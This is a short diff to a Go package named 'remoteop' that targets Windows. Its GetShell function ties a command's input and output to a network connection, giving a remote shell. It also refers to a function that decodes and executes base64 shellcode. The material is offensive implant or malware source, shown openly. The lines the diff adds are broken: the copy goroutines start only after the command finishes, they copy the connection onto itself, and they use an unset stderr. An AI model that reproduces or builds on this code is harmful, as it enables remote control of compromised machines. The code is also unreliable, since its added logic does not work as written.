@@ -4,6 +4,8 @@ package remoteop
 
 import (
 	"encoding/base64"
+	"io"
+	"log"
 	"net"
 	"os/exec"
 	"golang.org/x/sys/windows"
@@ -24,6 +26,17 @@ func GetShell(conn net.Conn) {
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	_ = cmd.Run()
+
+	copydata := func(r io.Reader, w io.Writer) {
+		_, err := io.Copy(w, r)
+		if err != nil {
+			log.Println(err)
+		}
+	}
+
+	go copydata(cmd.Stdin, conn)
+	go copydata(conn, cmd.Stdout)
+	go copydata(conn, cmd.Stderr)
 }
 
 // InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
